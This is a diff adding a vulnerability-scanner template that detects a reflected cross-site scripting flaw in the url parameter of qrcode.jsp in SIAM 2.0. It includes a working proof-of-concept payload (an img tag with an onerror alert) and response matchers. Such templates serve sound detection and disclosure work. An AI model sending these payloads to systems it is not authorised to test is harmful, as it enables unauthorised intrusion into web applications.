@@ -1,0 +1,28 @@
+id: siam-xss
+name: SIAM 2.0 - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: A Reflected Cross-Site Scripting (XSS) vulnerability has been identified in the SIAM Invitation application.
+  The url parameter of the qrcode.jsp page does not properly sanitize user input, allowing the injection and execution of
+  malicious scripts in the browser.
+reference: https://vuldb.com/?submit.496171
+tags:
+- siam
+- convite
+- xss
+- vuln
+requests:
+- method: GET
+  path: /siam-convite/qrcode.jsp?url=1%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
+  matchers:
+  - type: body
+    words:
+    - <img src=x onerror=alert(document.domain)>
+    - SIAM</a>
+  - type: body
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
